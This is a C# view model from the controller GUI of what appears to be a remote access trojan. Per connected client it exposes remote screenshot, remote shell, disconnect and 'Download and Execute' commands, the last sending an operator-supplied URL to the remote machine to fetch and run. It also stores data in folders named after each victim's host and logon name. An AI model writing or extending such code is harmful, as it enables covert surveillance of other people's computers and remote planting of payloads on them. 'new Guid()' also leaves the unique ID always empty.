namespace GuiServer.ServerImplementation.ViewModel
{
    using GuiServer.ViewImplementation.Presenter;
    using GuiServer.ViewImplementation.Windows;
    using MarrySocket.MServer;
    using NetworkObjects;
    using System;
    using System.ComponentModel;
    using System.IO;
    using System.Windows.Input;
    using System.Windows.Media.Imaging;

    public class ClientViewModel : INotifyPropertyChanged
    {
        public const string USER_FOLDER_NAME = "user";

        private ClientSocket clientSocket;
        private ComputerInfo computerInfo;
        private RemoteShellPresenter remoteShellPresenter;
        private ScreenshotPresenter screenShotPresenter;

        private int id;
        private bool canScreenshot;
        private bool canDisconnect;
        private bool canDownload;
        private bool canRemoteShell;


        public ClientViewModel(ClientSocket clientSocket)
        {
            this.UniqueId = new Guid();
            this.clientSocket = clientSocket;
            this.Init();
        }

        private void Init()
        {
            this.Id = clientSocket.Id;
            this.canScreenshot = true;
            this.canDisconnect = true;
            this.canDownload = true;
            this.canRemoteShell = true;

            this.remoteShellPresenter = new RemoteShellPresenter(this);
            this.screenShotPresenter = new ScreenshotPresenter(this);

            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect);
            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot);
            this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload);
            this.CmdRemoteShell = new CommandHandler(() => this.RemoteShell(), this.CanRemoteShell);
        }

        public event PropertyChangedEventHandler PropertyChanged;

        public Guid UniqueId { get; private set; }
        public int Id { get { return this.id; } set { this.id = value; NotifyPropertyChanged("Id"); } }
        public ComputerInfo ComputerInfo { get { return this.computerInfo; } set { this.computerInfo = value; NotifyPropertyChanged("ComputerInfo"); } }
        public string Ip { get { return this.clientSocket.Ip; } }
        public string FullName { get { return string.Format("{0}@{1}", this.id, this.Ip); } }
        public bool CanScreenshot { get { return this.canScreenshot; } set { this.canScreenshot = value; NotifyPropertyChanged("CanScreenshot"); } }
        public bool CanDisconnect { get { return this.canDisconnect; } set { this.canDisconnect = value; NotifyPropertyChanged("CanDisconnect"); } }
        public bool CanDownload { get { return this.canDownload; } set { this.canDownload = value; NotifyPropertyChanged("CanDownload"); } }
        public bool CanRemoteShell { get { return this.canRemoteShell; } set { this.canRemoteShell = value; NotifyPropertyChanged("CanRemoteShell"); } }
        public string UserPath { get { return this.GenerateUserPath(); } }


        public ICommand CmdDisconnect { get; private set; }
        public ICommand CmdScreenshot { get; private set; }
        public ICommand CmdDownloadExecute { get; private set; }
        public ICommand CmdRemoteShell { get; private set; }


        private void Disconnect()
        {
            this.clientSocket.Close();
        }


        private void Screenshot()
        {
            ScreenshotWindow screenShotWindow = new ScreenshotWindow();
            this.screenShotPresenter.SetScreenshotWindow(screenShotWindow);
            this.screenShotPresenter.Show();

        }

        public void UpdateScreenshotOutput(BitmapImage bitmapImage)
        {
            this.screenShotPresenter.UpdateScreenshot(bitmapImage);
        }


        private void DownloadExecute()
        {
            string url = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
            if (!string.IsNullOrEmpty(url))
            {
                DownloadExec downloadExec = new DownloadExec(url);
                this.clientSocket.SendObject(PacketId.DOWNLOAD_AND_EXECUTE, downloadExec);
            }
        }


        private void RemoteShell()
        {
            RemoteShellWindow remoteShellWindow = new RemoteShellWindow();
            this.remoteShellPresenter.SetRemoteShellWindow(remoteShellWindow);
            this.remoteShellPresenter.Show();
        }

        public void UpdateRemoteShellOutput(string output)
        {
            this.remoteShellPresenter.UpdateOutput(output);
        }

        public void SendObject(short packetId, object myClass)
        {
            this.clientSocket.SendObject(packetId, myClass);
        }

        public void NotifyPropertyChanged(string obj)
        {
            if (PropertyChanged != null)
            {
                this.PropertyChanged(this, new PropertyChangedEventArgs(obj));
            }
        }

        private string GenerateUserPath()
        {
            string path;

            if (this.ComputerInfo != null)
            {
                path = Path.Combine(Program.GetApplicationPath(), ClientViewModel.USER_FOLDER_NAME, this.ComputerInfo.HostName, this.ComputerInfo.LogonName) + @"\";
            }
            else
            {
                path = Path.Combine(Program.GetApplicationPath(), ClientViewModel.USER_FOLDER_NAME, this.UniqueId.ToString()) + @"\";
            }

            return path;
        }

    }
}
